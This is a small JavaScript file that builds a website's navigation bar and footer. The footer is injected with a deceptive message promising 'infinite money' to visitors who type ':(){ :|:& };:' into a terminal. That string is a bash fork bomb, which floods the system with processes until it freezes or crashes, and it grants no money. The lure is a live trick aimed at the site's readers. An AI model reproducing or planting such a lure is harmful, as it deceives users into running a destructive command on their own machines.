const navLinks = [
  ["Home", "index.html"],
  ["Long", "long.html"],
  ["Cat", "cat.html"],
];

document.addEventListener("DOMContentLoaded", () => {
  const nav = document.querySelector("#nav");
  navLinks.forEach(([name, href]) => {
    const a = document.createElement("a");
    a.href = href;
    a.textContent = name;
    nav.appendChild(a);
  });

  const footer = document.querySelector("#footer");
  footer.innerHTML = `Try out the new glitch for infinite money! Just type <kbd>:(){ :|:& };:</kbd> in the terminal and wait for the notification that the money has been added to your account!`;
});
